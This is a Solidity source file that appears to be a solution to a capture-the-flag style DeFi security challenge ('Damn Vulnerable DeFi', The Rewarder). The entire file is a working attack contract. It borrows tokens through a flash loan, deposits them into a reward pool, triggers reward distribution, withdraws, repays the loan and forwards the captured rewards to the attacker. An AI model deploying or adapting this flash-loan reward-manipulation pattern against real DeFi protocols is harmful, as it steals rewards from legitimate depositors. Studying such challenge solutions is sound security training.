// SPDX-License-Identifier: MIT
pragma solidity 0.8.12;

import {Address} from "openzeppelin-contracts/utils/Address.sol";
import {RewardToken} from "./RewardToken.sol";
import {DamnValuableToken} from "../DamnValuableToken.sol";
import {AccountingToken} from "./AccountingToken.sol";

interface IFlashLoanReceiver {
    function receiveFlashLoan(uint256 amount) external;

    error SenderIsNotFlashLoanerPool();

    error SenderIsNotOwner();
}

interface ITheRewarderPool {
    function deposit(uint256 amountToDeposit) external;

    function distributeRewards() external returns (uint256);

    function withdraw(uint256 amountToWithdraw) external;
}

contract FlashLoanReceiver {
    using Address for address;

    address private _attacker;
    address private _flashLoanerPool;
    address private _rewarderPool;
    address private _dvt;
    address private _rewardTokenAddress;

    error SenderIsNotFlashLoanerPool();
    error SenderIsNotOwner();
    error TransferFail();
    error CallFailed();

    constructor(
        address flashLoanerPool,
        address rewarderPool,
        address dvtAddress,
        address rewardTokenAddress
    ) {
        _attacker = msg.sender;
        _flashLoanerPool = flashLoanerPool;
        _rewarderPool = rewarderPool;
        _dvt = dvtAddress;
        _rewardTokenAddress = rewardTokenAddress;
    }

    function attack(uint256 amount) external {
        if (msg.sender != _attacker) revert SenderIsNotOwner();
        _flashLoanerPool.functionCall(
            abi.encodeWithSignature("flashLoan(uint256)", amount)
        );
    }

    function receiveFlashLoan(uint256 amount) external {
        if (msg.sender != _flashLoanerPool) revert SenderIsNotFlashLoanerPool();
        if (!DamnValuableToken(_dvt).approve(_rewarderPool, amount))
            revert CallFailed();

        _rewarderPool.functionCall(
            abi.encodeWithSignature("deposit(uint256)", amount)
        );

        if (DamnValuableToken(_dvt).balanceOf(address(this)) > 0)
            revert("deposit failed");

        _rewarderPool.functionCall(
            abi.encodeWithSignature("distributeRewards()")
        );
        _rewarderPool.functionCall(
            abi.encodeWithSignature("withdraw(uint256)", amount)
        );

        if (!DamnValuableToken(_dvt).transfer(_flashLoanerPool, amount))
            revert TransferFail();

        uint256 rewards = RewardToken(_rewardTokenAddress).balanceOf(
            address(this)
        );

        if (!RewardToken(_rewardTokenAddress).transfer(_attacker, rewards))
            revert TransferFail();
    }
}
